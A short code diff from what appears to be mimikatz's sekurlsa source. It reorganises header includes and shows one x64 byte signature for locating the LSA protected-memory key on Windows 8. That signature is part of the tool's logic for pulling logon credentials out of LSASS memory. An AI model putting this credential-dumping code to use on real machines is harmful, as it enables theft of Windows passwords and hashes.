@@ -1,11 +1,16 @@
+#include "../../../include/mimikatz/inc/NTSecPKG.h"
+#include <ntstatus.h>
+#include "../../../../core/include/core/winapi_simple.h"
+#include "../../../include/mimikatz/sekurlsa/globals_sekurlsa.h"
+#include "../../../include/mimikatz/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.h"
 /*	Benjamin DELPY `gentilkiwi`
 	http://blog.gentilkiwi.com
 	benjamin@gentilkiwi.com
 	Licence : http://creativecommons.org/licenses/by/3.0/fr/
 */
-#include "winapi.h"
-#include "kuhl_m_sekurlsa_nt6.h"
-#include "core\string_crypt.h"
+//#include "winapi.h"
+//#include "kuhl_m_sekurlsa_nt6.h"
+//#include "core\string_crypt.h"
 
 #ifdef _M_X64
 BYTE PTRN_WNO8_LsaInitializeProtectedMemory_KEY[]	= {0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8b, 0x4c, 0x24, 0x48, 0x48, 0x8b, 0x0d};
